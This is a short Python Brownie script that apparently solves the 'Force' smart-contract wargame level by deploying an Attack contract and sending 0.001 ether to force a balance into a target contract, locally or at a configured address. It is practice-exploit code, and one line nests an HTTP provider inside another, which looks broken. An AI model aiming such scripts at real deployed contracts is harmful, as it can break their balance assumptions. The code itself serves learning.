from brownie import Attack, Force, network, config, Contract
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        force = Force.deploy({"from": account})

        attack = Attack.deploy(force, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        force = Contract.from_abi(
            Force._name,
            config["networks"][network.show_active()]["force"],
            Force.abi,
        )

        attack = Attack.deploy(force, {"from": account})

    attack.attack({"from": account, "value": "0.001 ether"}).wait(1)

    print(f"Force balance is {force.balance()}")


def main():
    attack()
